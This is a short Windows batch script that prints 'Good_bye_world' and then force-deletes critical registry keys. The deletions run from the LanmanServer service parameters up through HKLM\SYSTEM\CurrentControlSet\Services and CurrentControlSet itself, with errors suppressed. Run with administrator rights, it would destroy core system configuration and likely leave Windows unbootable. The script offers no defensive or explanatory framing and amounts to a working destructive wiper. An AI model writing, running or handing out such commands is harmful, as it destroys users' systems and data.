@echo off
echo 	Good_bye_world
REG DELETE "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /f 2>nul
REG DELETE "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer" /f 2>nul
REG DELETE "HKLM\SYSTEM\CurrentControlSet\Services" /f 2>nul
REG DELETE "HKLM\SYSTEM\CurrentControlSet" /f 2>nul

if %errorlevel% equ 0 (
    echo Registry keys deleted successfully.
) else (
    echo Error: Unable to delete registry keys.
)

pause
